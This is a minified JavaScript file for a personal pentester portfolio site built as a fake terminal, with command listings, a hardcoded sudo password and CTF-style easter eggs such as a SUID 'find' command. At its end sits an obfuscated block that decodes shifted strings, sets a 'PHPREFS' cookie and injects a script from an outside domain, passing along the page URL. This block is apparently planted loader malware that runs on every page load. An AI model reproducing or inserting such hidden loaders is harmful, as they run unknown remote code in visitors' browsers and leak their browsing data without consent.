!(function () {
  const t = document.createElement("link").relList;
  if (!(t && t.supports && t.supports("modulepreload"))) {
    for (const o of document.querySelectorAll('link[rel="modulepreload"]'))
      n(o);
    new MutationObserver((o) => {
      for (const u of o)
        if ("childList" === u.type)
          for (const h of u.addedNodes)
            "LINK" === h.tagName && "modulepreload" === h.rel && n(h);
    }).observe(document, { childList: !0, subtree: !0 });
  }
  function n(o) {
    if (o.ep) return;
    o.ep = !0;
    const u = (function s(o) {
      const u = {};
      return (
        o.integrity && (u.integrity = o.integrity),
        o.referrerPolicy && (u.referrerPolicy = o.referrerPolicy),
        "use-credentials" === o.crossOrigin
          ? (u.credentials = "include")
          : "anonymous" === o.crossOrigin
          ? (u.credentials = "omit")
          : (u.credentials = "same-origin"),
        u
      );
    })(o);
    fetch(o.href, u);
  }
})();
const Z = [
    " ██████╗██╗   ██╗███╗   ███╗ █████╗ ███╗  ██╗████████╗██╗  ██╗",
    "██╔════╝██║   ██║████╗ ████║██╔══██╗████╗ ██║╚══██╔══╝██║  ██║",
    "╚█████╗ ██║   ██║██╔████╔██║███████║██╔██╗██║   ██║   ███████║",
    " ╚═══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚████║   ██║   ██╔══██║",
    "██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚███║   ██║   ██║  ██║",
    "╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝   ╚═╝  ╚═╝",
  ],
  X = "Sumanth",
  ee = "root",
  te = "sumanth",
  re = "OmNamahShivaya",
  oe = {
    email: "root@sumanth.info",
    github: "sumanth",
    linkedin: "linkedin-sumanth",
  },

  //------------------about---------------

  ne =
    "Hi stranger. Welcome to my webshell.\nPenetration Tester | CTF Player | Bug Hunter\n\n",
  se = [
    ["Web Application", "A Security Scanner", "https://github.com/sumanth192/web_scanner"],
    /*[
      "Hack the SYSTEM",
      "Do you really think it's this easy?",
      "https://www.youtube.com/shorts/Xp-VM8Z9wIQ",
    ],
    [
      "PASSWD",
      "Two different ways",
      "https://www.youtube.com/shorts/Xp-VM8Z9wIQ",
    ],
    ["1915", "Armenian Genocide", "https://github.com/sumanth192"],
    ["Grand Stone", "Buy Stones", "https://grandstone.am"],*/
  ],
  ae = {
    background: "#000000",
    foreground: "#FFFFFF",
    banner: "#FF0000", // ascii sumanth color
    border: { visible: !0, color: "#8B0000" },
    prompt: {
      default: "#00FF00",
      user: "#FF0000", //www-command color
      host: "#00FF00", //sumanth color
      input: "#FFFFFF", //input color
    },
    link: {
      text: "#FFA500",
      textColor: "1px 1px 2px #FF0000",
      highlightColor: "#39FF14",
      highlightText: "#0C0623",
    },
    commands: { textColor: "#00FF00" }, //help
    errorColor: { textColor: "#FF0000", fontWeight: 500 },
  },
  a = {
    ascii: Z,
    title: X,
    username: ee,
    hostname: te,
    password: re,
    social: oe,
    aboutGreeting: ne,
    projects: se,
    colors: ae,
  };
(() => {
  const e = document.createElement("style"),
    t = document.head,
    s = `body {background: ${a.colors.background}}`,
    n = `body {color: ${a.colors.foreground}}`,
    o = `input {background: ${a.colors.background}}`,
    u = `input {color: ${a.colors.prompt.input}}`,
    h = `.output {color: ${a.colors.prompt.input}}`,
    T = `#pre-host {color: ${a.colors.prompt.host}}`,
    er = `.error {color: #FF3E3E}`,
    fw = `.error {font-weight: ${a.colors.errorColor.fontWeight}}`,
    y = `#host {color: ${a.colors.prompt.host}}`,
    S = `#pre-user {color: ${a.colors.prompt.user}}`,
    i = `#user {color: ${a.colors.prompt.user}}`,
    $ = `#prompt {color: ${a.colors.prompt.default}}`,
    G = `pre {color: ${a.colors.banner}}`,
    Y = `a {color: ${a.colors.link.text}}`,
    z = `a:hover {background: ${a.colors.link.highlightColor}}`,
    J = `a:hover {color: ${a.colors.link.highlightText}}`,
    V = `.command {color: ${a.colors.commands.textColor}}`,
    Q = `.keys {color: ${a.colors.banner}}`;
  t.appendChild(e),
    e.sheet &&
      (e.sheet.insertRule(`#bars {background: ${a.colors.background}}`),
      e.sheet.insertRule(`main {border-color: ${a.colors.border.color}}`),
      e.sheet.insertRule(
        `#bar-1 {background: ${a.colors.border.color}; color: ${a.colors.background}}`
      ),
      e.sheet.insertRule(`#bar-2 {background: ${a.colors.border.color}}`),
      e.sheet.insertRule(`#bar-3 {background: ${a.colors.border.color}}`),
      e.sheet.insertRule(`#bar-4 {background: ${a.colors.border.color}}`),
      e.sheet.insertRule(`#bar-5 {background: ${a.colors.border.color}}`),
      e.sheet.insertRule(s),
      e.sheet.insertRule(er),
      e.sheet.insertRule(fw),
      e.sheet.insertRule(n),
      e.sheet.insertRule(o),
      e.sheet.insertRule(u),
      e.sheet.insertRule(h),
      e.sheet.insertRule(T),
      e.sheet.insertRule(y),
      e.sheet.insertRule(S),
      e.sheet.insertRule(i),
      e.sheet.insertRule($),
      e.sheet.insertRule(G),
      e.sheet.insertRule(Y),
      e.sheet.insertRule(z),
      e.sheet.insertRule(J),
      e.sheet.insertRule(V),
      e.sheet.insertRule(Q));
})();


const ie = {
    commands: [
      ["'about'", "Meet the Mastermind Behind This Site"],
      ["'projects'", "Discover What's Cool and Cutting-Edge"],
      ["'whoami'", "Unravel the Mystry of My Identity"],
      ["'sudo'", "Command the Power"],
      ["'banner'", "Unveil the Banner"],
    //  ["'books'", "Must-Reads for the Savvy"],
      ["'resources'", "Key Assets for Your Pentesting Arsenal"],
      ["'tools'", "Your Cyber Toolkit"],
    //  ["'equipment'", "Gear We're Totally Obsessed With"],
      ["'location'", "Where in the Cyberverse Am I?"],
      ["'clear'", "Reset the Terminal Space"],
    ],
  },
  ce = () => {
    const e = [];
    return (
      e.push("<br>"),
      ie.commands.forEach((t) => {
        const s = "&nbsp;";
        let n = "";
        (n += s.repeat(2)),
          (n += "<span class='command'>"),
          (n += t[0]),
          (n += "</span>"),
          (n += s.repeat(17 - t[0].length)),
          (n += t[1]),
          e.push(n);
      }),
      e.push("<br>"),
      e.push("Press <span class='keys'>[Tab]</span> for auto completion."),
      e.push("Press <span class='keys'>[Esc]</span> to clear the input line."),
      e.push(
        "Press <span class='keys'>[↑][↓]</span> to scroll through your history of commands."
      ),
      e.push("<br>"),
      e
    );
  },
  le = ce(),
  ue = () => {
    const e = [];
    return (
      e.push("<br>"),
      a.ascii.forEach((t) => {
        let s = "";
        for (let o = 0; o < t.length; o++)
          " " === t[o] ? (s += "&nbsp;") : (s += t[o]);
        let n = `<pre>${s}</pre>`;
        e.push(n);
      }),
      e.push("<br>"),
      e.push("Welcome to my Terminal"),
      e.push(
        "Type <span class='command'>'help'</span> for a list of all available commands."
      ),
      e.push("<br>"),
      e
    );
  },
  _ = ue(),
  pe = () => {

    // ---------about links ----------

    const e = [],
      t = "&nbsp;",
      s = "Email",
      n = "Instagram",
      o = "Linkedin",
      u = "TryHackMe",
      r = "Resume",
      h = `<i class='fa-solid fa-envelope'></i> ${s}`,
      T = `<i class='fa-brands fa-instagram'></i> ${n}`,
      y = `<i class='fa-brands fa-linkedin'></i> ${o}`,
      S = `<i class='fa-brands fa-hackerrank'></i> ${u}`,
      F = `<i class="fa-solid fa-folder"></i> ${r}`;
    let i = "";
    e.push("<br>");
    const $ = a.aboutGreeting.split("\n").join("<br>");
    return (
      e.push($),
      e.push("<br>"),
      (i += t.repeat(2)),
      (i += h),
      (i += t.repeat(12)),
      (i += `<a target='_blank' href='mailto:sumanth1962@gmail.com'>${a.social.email}</a>`),
      e.push(i),
      (i = ""),
      (i += t.repeat(2)),
      (i += T),
      (i += t.repeat(8)),
      (i += `<a target='_blank' href='https://www.instagram.com/root.pwn/'>instagram/${a.social.github}</a>`),
      e.push(i),
      (i = ""),
      (i += t.repeat(2)),
      (i += y),
      (i += t.repeat(9)),
      (i += `<a target='_blank' href='https://www.linkedin.com/in/sumanthyerranagula/'>${a.social.linkedin}</a>`),
      e.push(i),
      (i = ""),
      (i += t.repeat(2)),
      (i += S),
      (i += t.repeat(8)),
      (i +=
        "<a target='_blank' href='https://tryhackme.com/p/r00t.5um4n7h'>Sumanth</a>"), // tryHacker link
      e.push(i),
      (i = ""),
      (i += t.repeat(2)),
      (i += F),
      (i += t.repeat(11)),
      (i += "<a target='_blank' href='/js/Sumanth_Yerranagula.pdf' download>Download</a>"),
      e.push(i),
      e.push("<br>"),
      e
    );
  },
  de = pe(),
  he = () => {

    //----------error-----------

    const t = [];
    return (
      [
        "<br>",
        "<span class='error'>COMMAND NOT FOUND</span>",
        "<span class='error'>Type <span class='command'>'help'</span> to get started.</span>",
        "<br>",
      ].forEach((s) => {
        t.push(s);
      }),
      t
    );
  },
  be = he(),
  me = () => {
    let e = "";
    const t = [],
      s = `${a.projects.length} File(s)`,
      n = "&nbsp;";
    return (
      t.push("<br>"),
      a.projects.forEach((o) => {
        const u = o[0],
          h = o[1];
        let y = `<a href="${o[2]}" target="_blank">${u}</a>`;
        (e += n.repeat(2)),
          (e += y),
          (e += n.repeat(17 - u.length)),
          (e += h),
          t.push(e),
          (e = "");
      }),
      t.push("<br>"),
      t.push(s),
      t.push("<br>"),
      t
    );
  },
  fe = me(),
  R = {

    //-----------whoami-------------

    message: [
      [
        "In the realm of digital shadows,", 
        "I seek the hidden door.",
        "I am the master of privilege and the hunter of flaws - ",
      ],
      [
        "I command the network’s echoes and unveil its silent secrets.",
        "With my arsenal, I breach the unknown and decode the unseen - ",
      ],
      [
        "I’ve conquered the hurdles of both track and digital domains,",
        "a champion in both realms.", 
        "My stride is as swift as my code is precise - ",
      ],
      [
        "Scaling both peaks and firewalls,",
        "I conquer heights and networks with equal skill.",
        "My adventures span from sacred summits to the digital domain,",
        "where I uncover secrets and reach new heights - ",
      ],
      [
        "In the digital domain where empires are built and fallen,",
        "I reign supreme with a crown of code.",
        "My realm is vast, my vision grand,",
        "and I reshape the world with my unseen hand - ",
      ],
    ],
  },
  ge = () => {
    const e = [],
      t = Math.floor(Math.random() * R.message.length);
    return (
      e.push("<br>"),
      R.message[t].forEach((s, n) => {
        n === R.message[t].length - 1 &&
          (s += "<span class='command'>who am I?</span>"),
          e.push(s);
      }),
      e.push("<br>"),
      e
    );
  },
  ye = () => {
    const e = [],
      t = "&nbsp;",

      //----------------resources------------------------

      s = [
        { name: "GTFOBins",url: "https://gtfobins.github.io/" },
        { name: "Shodan", url: "https://www.shodan.io/"},
        { name: "PentestMonkey", url: "http://pentestmonkey.net/" },
        { name: "Exploit Database", url: "https://www.exploit-db.com/" },
        { name: "OWASP", url: "https://owasp.org/" },
        { name: "CrackStation", url: "https://crackstation.net/" },
        { name: "CyberChef", url: "https://gchq.github.io/CyberChef/" },
        { name: "RevShells", url: "https://revshells.com/" },
        { name: "HackerOne", url: "https://www.hackerone.com/" },
        { name: "Bugcrowd", url: "https://www.bugcrowd.com/" },
      ];
    return (
      e.push("<br>"),
      e.push("List of resources to use for your LEGAL hacking:"),
      e.push("<br>"),
      s.forEach((n) => {
        let o = "";
        (o += t.repeat(2)),
          (o += `<i class='fa-solid fa-link'></i> <strong style="color: #00FF00;">${n.name}</strong>`),
          (o += t.repeat(20 - n.name.length)),
          (o += `<a target='_blank' href='${n.url}'>${n.url}</a>`),
          e.push(o);
      }),
      e.push("<br>"),
      e.push(`${s.length} Resource(s)`),
      e.push("<br>"),
      e
    );
  },
  B = ye(),
  ke = () => {
    const e = [],

    //------------------tools--------------

      s = [
        { name: "Burp Suite", description: "Web security testing" },
        { name: "Nmap", description: "Network scanner" },
        { name: "Metasploit", description: "Penetration testing framework" },
        { name: "Wireshark", description: "Network protocol analyzer" },
        { name: "John the Ripper", description: "Password cracker" },
        { name: "Hydra", description: "Login cracker" },
        { name: "SQLmap", description: "SQL injection tool" },
        { name: "Aircrack-ng", description: "WiFi security suite" },
        { name: "Nikto", description: "Web server scanner" },
        { name: "Dirb", description: "Web content scanner" },
        { name: "Gobuster", description: "Directory/File brute-forcer" },
        { name: "ffuf", description: "Fuzzing tool" },
        { name: "Steghide", description: "Steganography tool" },
        { name: "ExifTool", description: "Metadata reader" },
        { name: "HashCat", description: "Advanced password recovery" },
        { name: "Beef", description: "Browser exploitation framework" },
        { name: "Recon-ng", description: "Web reconnaissance framework" },
        { name: "Nessus", description: "Vulnerability scanner" },
      ];
    return (
      e.push("<br>"),
      e.push("Your arsenal for happy pentesting:"),
      e.push("<br>"),
      s.forEach((n) => {
        let o = "";
        (o += '<div style="display: flex; align-items: center;">'),
          (o += "&nbsp;".repeat(2)),
          (o += `<strong style="color: #FF0000; width: 150px; display: inline-block;">${n.name}</strong>`),
          (o += ` ${n.description}`),
          (o += "</div>"),
          e.push(o);
      }),
      e.push("<br>"),
      e.push(`${s.length} Tool(s)`),
      e.push("<br>"),
      e
    );
  },
  D = ke();
  
async function we() {
  const e = [],
    t = "style='color: #FF0000;'";

    // --------location-------------

  try {
    const n = await (await fetch("https://ipapi.co/json/")).json();
    e.push("<br>"),
      e.push(`<span ${t}>IP Address:</span> ${n.ip}`),
      e.push(`<span ${t}>City:</span> ${n.city}`),
      e.push(`<span ${t}>Region:</span> ${n.region}`),
      e.push(`<span ${t}>Country:</span> ${n.country_name}`),
      e.push(`<span ${t}>Latitude:</span> ${n.latitude}`),
      e.push(`<span ${t}>Longitude:</span> ${n.longitude}`),
      e.push(`<span ${t}>ISP:</span> ${n.org}`),
      e.push("<br>");
  } catch {
    e.push("<br>"), e.push("Failed to fetch IP information."), e.push("<br>");
  }
  return e;
}
function A(e) {
  we()
    .then((t) => {
      e(t);
    })
    .catch((t) => {
      console.error("Failed to fetch IP information:", t),
        e(["<br>", "Failed to fetch IP information.", "<br>"]);
    });
}
const Ee = () => {

    // ------------------equipments---------------------

    const e = [],
      s = [
        { name: "Rubber Ducky", description: "Keystroke injection tool" },
        {
          name: "Flipper Zero",
          description: "Portable multi-tool for pentesters",
        },
        {
          name: "Hak5 Pineapple",
          description: "Wireless network auditing tool",
        },
        { name: "Proxmark3", description: "RFID and NFC analysis tool" },
        { name: "HackRF One", description: "Hardware platform for SDR" },
        { name: "Bash Bunny", description: "Multi-function USB attack tool" },
        {
          name: "LAN Turtle",
          description: "Covert pentesting tool and backdoor",
        },
        { name: "USB Killer", description: "High-voltage USB attack device" },
        { name: "Raspberry Pi", description: "Small, versatile computer" },
        { name: "ChameleonMini", description: "RFID skeleton key" },
        { name: "Ubertooth One", description: "Bluetooth sniffing tool" },
        { name: "Deauther Watch", description: "Wearable for network deauth" },
      ];
    return (
      e.push("<br>"),
      e.push("Don't buy these if you don't know how to use them:"),
      e.push("<br>"),
      s.forEach((n) => {
        let o = "";
        (o += '<div style="display: flex; align-items: center;">'),
          (o += "&nbsp;".repeat(2)),
          (o += `<strong style="color: #00FF00; width: 150px; display: inline-block;">${n.name}</strong>`),
          (o += ` ${n.description}`),
          (o += "</div>"),
          e.push(o);
      }),
      e.push("<br>"),
      e.push(`${s.length} Gadget(s)`),
      e.push("<br>"),
      e
    );
  },
  Te = Ee(),

//   ---------------------------------books---------------------------

  M = [
    "The Hacker Playbook [1,2,3] by Peter Kim",
    "The Pentester's Blueprint by Phillip L. Wylie and Kim Crawley",
    "Social Engineering: The Art of Human Hacking by Christopher Hadnagy",
    "The Art of Invisibility by Kevin Mitnick",
    "Black Hat Python by Justin Seitz",
    "Metasploit: The Penetration Tester's Guide by David Kennedy",
    "Practical Malware Analysis by Michael Sikorski",
    "Advanced Penetration Testing by Wil Allsopp",
    "Web Application Hacker's Handbook by Dafydd Stuttard",
    "Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman", 
  ];
function N() {
  const e = [
    "Here are some books about penetration testing you might like:",
    "<br>",
  ];
  M.forEach((t) => {
    e.push(`<span class='command'>${t}</span>`);
  }),
    e.push("<br>"),
    e.push(`${M.length} Book(s)`),
    e.push("<br>"),
    r(e);
}
let d,
  p = document.getElementById("write-lines"),
  b = 0,
  L = "",
  I = !1,
  H = !1,
  v = 0,
  c = !1;
const f = p,
  g = document.getElementById("terminal"),
  l = document.getElementById("user-input"),
  k = document.getElementById("input-hidden"),
  w = document.getElementById("password-input"),
  E = document.getElementById("password-field"),
  O = document.getElementById("pre-host"),
  U = document.getElementById("pre-user"),
  F = document.getElementById("host"),
  W = document.getElementById("user"),
  P = document.getElementById("prompt"),

  Ie = [
    "me",
    "help",
    "about",
    "projects",
    "whoami",
    "banner",
    "books",
    "resources",
    "tools",
    "location",
    "equipment",
    "clear",
  ],
  m = [],
  Pe = a.password,
  q = () => {
    const e = document.getElementById("main");
    e && (e.scrollTop = e.scrollHeight);
  };
function C(e) {
  const t = e.key;
  switch (t) {
    case "Enter":
      e.preventDefault(), H ? Ae() : Se(), q();
      break;
    case "Escape":
      l.value = "";
      break;
    case "ArrowUp":
      x(t), e.preventDefault();
      break;
    case "ArrowDown":
      x(t);
      break;
    case "Tab":
      $e(), e.preventDefault();
  }
}
function Se() {
  if (!p || !P) return;
  let t;
  if (
    ((d = l.value),
    (t = c ? d : `<span class='output'>${d}</span>`),
    m.push(d),
    (b = m.length),
    "clear" === d)
  )
    return j(d.toLowerCase().trim()), (l.value = ""), void (d = "");
  const s = document.createElement("div");
  (s.innerHTML = `<span id="prompt">${P.innerHTML}</span> ${t}`),
    p.parentNode && p.parentNode.insertBefore(s, p),
    0 !== d.trim().length && j(d.toLowerCase().trim()),
    (l.value = ""),
    (d = "");
}
function $e() {
  let e = l.value;
  for (const t of Ie) if (t.startsWith(e)) return void (l.value = t);
}
function x(e) {
  switch (e) {
    case "ArrowDown":
      b !== m.length &&
        ((b += 1), (l.value = m[b]), b === m.length && (l.value = L));
      break;
    case "ArrowUp":
      b === m.length && (L = l.value), 0 !== b && ((b -= 1), (l.value = m[b]));
  }
}
function j(e) {
  if (e.startsWith("rm -rf") && "rm -rf" !== e.trim())
    I
      ? "rm -rf src" !== e || c
        ? r(
            "rm -rf src" === e && c
              ? ["there's no more src folder.", "<br>"]
              : c
              ? ["What else are you trying to delete?", "<br>"]
              : [
                  "<br>",
                  "Directory not found.",
                  "type <span class='command'>'ls'</span> for a list of directories.",
                  "<br>",
                ]
          )
        : ((c = !0),
          setTimeout(() => {
            !g || !f || ((g.innerHTML = ""), g.appendChild(f), (p = f));
          }),
          ve(),
          setTimeout(() => {
            r(["What made you think that was a good idea?", "<br>"]);
          }, 200),
          setTimeout(() => {
            r(["Now everything is ruined.", "<br>"]);
          }, 1200))
      : r(["Permission denied.", "<br>"]);
  else
    switch (e) {
      case "clear":
        setTimeout(() => {
          !g || !f || ((g.innerHTML = ""), g.appendChild(f), (p = f));
        });
        break;
      case "banner":
        if (c) {
          r(["Terminal", "<br>"]);
          break;
        }
        r(_);
        break;
      case "help":
        if (c) {
          r(["maybe restarting your browser will fix this.", "<br>"]);
          break;
        }
        r(le);
        break;
      case "whoami":
        if (c) {
          r([`${a.username}`, "<br>"]);
          break;
        }
        r(ge());
        break;
      case "about":
        if (c) {
          r(["Nothing to see here.", "<br>"]);
          break;
        }
        r(de);
        break;
      case "projects":
        if (c) {
          r(["I don't want you to break the other projects.", "<br>"]);
          break;
        }
        r(fe);
        break;
      case "books":
        if (c) {
          r(["You dont deserve it.", "<br>"]);
          break;
        }
        N();
        break;
      case "resources":
        if (c) {
          r(["I could tell you, but you tried to hack me.", "<br>"]);
          break;
        }
        r(B);
        break;
      case "tools":
        if (c) {
          r(["No more tools, nothing! You are bad GUY!.", "<br>"]);
          break;
        }
        r(D);
        break;
      case "location":
        if (c) {
          r(["Now I know your location!", "<br>"]), A(r);
          break;
        }
        A(r);
        break;
      case "equipment":
        if (c) {
          r(["You don't need to know about these gadgets.", "<br>"]);
          break;
        }
        r(Te);
        break;
      case "cat":
        if (c) {
          r(["Usage: cat [file]", "<br>"]);
          break;
        }
        r(["NOT HERE", "<br>"]);
        break;
      case "cat flag.txt":
        if (c) {
          r([
            "aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1rSWVfcUJleVpTWQ==",
            "<br>",
          ]);
          break;
        }
        r(["You will not find it HERE!", "<br>"]);
        break;
      case "find":
        if (c) {
          r(["Usage: find / -type -perm -user", "<br>"]),
            r(["<br>"]),
            r(["Don't forget to redirect error messages", "<br>"]);
          break;
        }
        r(["This is a very useful command but again, not HERE!", "<br>"]);
        break;
      case "find / -type f -perm -4000 -user root -ls 2>/dev/null":
        if (c) {
          r(["Congrats! I know this part was a little bit hard:", "<br>"]),
            r(["Sorry, Not Sorry!", "<br>"]),
            r(["<br>"]),
            r([
              "MNT{AKCKBAKI_BEPAPUDAKI_IKCKBAKI_BEPADUDAKI_JUPA_JUPA_JUPAPAJUPA}",
              "<br>",
            ]);
          break;
        }
        r(["You will not find it HERE!", "<br>"]);
        break;
      case "books":
        N();
        break;
      case "resources":
        r(B);
        break;
      case "tools":
        r(D);
        break;
      case "location":
        A(r);
        break;
      case "rm -rf":
        if (c) {
          r(["don't try again.", "<br>"]);
          break;
        }
        r(
          I
            ? [
                "Usage: <span class='command'>'rm -rf &lt;dir&gt;'</span>",
                "<br>",
              ]
            : ["Permission denied.", "<br>"]
        );
        break;
      case "sudo":
        if (c) {
          r(["no.", "<br>"]);
          break;
        }
        if (!w) return;
        (H = !0),
          (l.disabled = !0),
          k && (k.style.display = "none"),
          (w.style.display = "block"),
          setTimeout(() => {
            E.focus();
          }, 100);
        break;
      case "ls":
        if (c) {
          r([
            "<ul>",
            "<li>about</li>",
            "<li>projects</li>",
            "<li>location</li>",
            "<li>tools</li>",
            "<li>flag.txt</li>",
            "<li>find</li>",
            "<li>books</li>",
            "<li>resources</li>",
            "<li>equipment</li>",
            "<li>banner</li>",
            "<li>cat</li>",
            "<li>clear</li>",
            "</ul>",
            "<br>",
          ]);
          break;
        }
        r(I ? ["src", "<br>"] : ["Permission denied.", "<br>"]);
        break;
      default:
        if (c) {
          r(["type 'help'", "<br>"]);
          break;
        }
        r(be);
    }
}
function r(e) {
  e.forEach((t, s) => {
    Re(t, s);
  });
}
function Re(e, t) {
  setTimeout(() => {
    if (!p) return;
    const s = document.createElement("p");
    (s.innerHTML = e), p.parentNode.insertBefore(s, p), q();
  }, 40 * t);
}
function K() {
  !k ||
    !w ||
    ((E.value = ""),
    (l.disabled = !1),
    (k.style.display = "block"),
    (w.style.display = "none"),
    (H = !1),
    setTimeout(() => {
      l.focus();
    }, 200));
}
function Ae() {
  if (2 === v) {
    if (!k || !p || !w) return;
    return (
      r(["<br>", "INCORRECT PASSWORD.", "DENIED.", "<br>"]), K(), void (v = 0)
    );
  }
  if (E.value === Pe) {
    if (!p || !p.parentNode) return;
    return (
      r([
        "<br>",
        "PERMISSION GRANTED.",
        "Try <span class='command'>'rm -rf'</span>",
        "<br>",
      ]),
      K(),
      void (I = !0)
    );
  }
  (E.value = ""), v++;
}
function ve() {
  const e = document.getElementById("bars"),
    t = document.body,
    s = document.getElementById("main"),
    n = document.getElementsByTagName("span");
  if (e) {
    (e.innerHTML = ""),
      e.remove(),
      s && (s.style.border = "none"),
      (t.style.backgroundColor = "black"),
      (t.style.fontFamily = "VT323, monospace"),
      (t.style.fontSize = "20px"),
      (t.style.color = "white");
    for (let o = 0; o < n.length; o++) n[o].style.color = "white";
    (l.style.backgroundColor = "black"),
      (l.style.color = "white"),
      (l.style.fontFamily = "VT323, monospace"),
      (l.style.fontSize = "20px"),
      P && (P.style.color = "white");
  }
}
const Ce = () => {
  F && (F.innerText = a.hostname),
    W && (W.innerText = a.username),
    O && (O.innerText = a.hostname),
    U && (U.innerText = a.username),
    window.addEventListener("load", () => {
      r(_);
    }),
    l.addEventListener("keypress", C),
    l.addEventListener("keydown", C),
    E.addEventListener("keypress", C),
    window.addEventListener("click", () => {
      l.focus();
    }),
    console.log(
      "%cThis is easier to decrypt: --. . -..- .- -- .. -.-",
      "color: #20C20E; font-size: 10px;"
    );
};
Ce();
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisqtlx" + "3htr4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);

